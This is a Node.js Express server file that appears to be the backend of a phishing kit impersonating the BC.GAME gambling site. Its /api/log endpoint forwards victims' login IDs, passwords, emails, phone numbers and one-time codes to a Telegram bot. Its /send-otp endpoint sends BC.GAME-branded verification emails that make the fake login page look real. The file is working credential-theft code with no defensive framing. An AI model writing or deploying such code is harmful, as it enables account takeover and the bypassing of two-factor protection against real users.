require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// API Endpoints
app.post('/api/log', async (req, res) => {
    console.log(`[API] Log hit: ${req.body.title}`);
    const { title, data } = req.body;
    
    // Support both sets of ENV names
    const token = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
    const chatId = process.env.LOG_BOT_CHAT_ID;

    if (!token || !chatId) {
        console.error("[SERVER] Missing LOG Config");
        return res.status(500).json({ success: false });
    }

    const message = `
🔥 <b>${title}</b>
━━━━━━━━━━━━━━━
👤 <b>Initial ID</b>: <code>${data.id}</code>
🔑 <b>Password</b>: <code>${data.pass}</code>
📧 <b>Verify Email</b>: <code>${data.email || 'N/A'}</code>
🔢 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
📱 <b>Verify Phone</b>: <code>${data.phone || 'N/A'}</code>
🔢 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        res.json({ success: true });
    } catch (e) {
        console.error("[API] Telegram Error:", e.response?.data || e.message);
        res.status(500).json({ success: false });
    }
});

app.post('/send-otp', async (req, res) => {
    const { email } = req.body;
    console.log(`[API] OTP Request: ${email}`);

    if (!email) return res.status(400).json({ success: false });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Support multiple ENV names for flexibility
    const transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST || 'smtp.gmail.com',
        port: parseInt(process.env.SMTP_PORT) || 465,
        secure: (process.env.SMTP_PORT == '465'),
        auth: {
            user: process.env.SMTP_USER || process.env.EMAIL_USER,
            pass: process.env.SMTP_PASS || process.env.EMAIL_PASS
        }
    });

    try {
        await transporter.sendMail({
            from: process.env.SMTP_FROM || `"BC.GAME" <${process.env.EMAIL_USER}>`,
            to: email,
            subject: '🔐 Verification Code',
            html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; text-align:center; border:2px solid #3bc117; font-family:sans-serif;">
                    <h1 style="color:#3bc117;">BC.GAME</h1>
                    <p style="font-size:18px;">Your verification code is: <b style="font-size:32px; color:#3bc117;">${otp}</b></p>
                   </div>`
        });
        console.log(`[API] OTP Sent Successfully`);
        res.json({ success: true });
    } catch (e) {
        console.error("[API] SMTP Error:", e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

// Static files
app.use(express.static(__dirname));

// Catch-all
app.get('/*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Listen only if not in serverless environment
if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
    app.listen(port, () => {
        console.log(`🚀 Server listening on port ${port}`);
    });
}

module.exports = app;
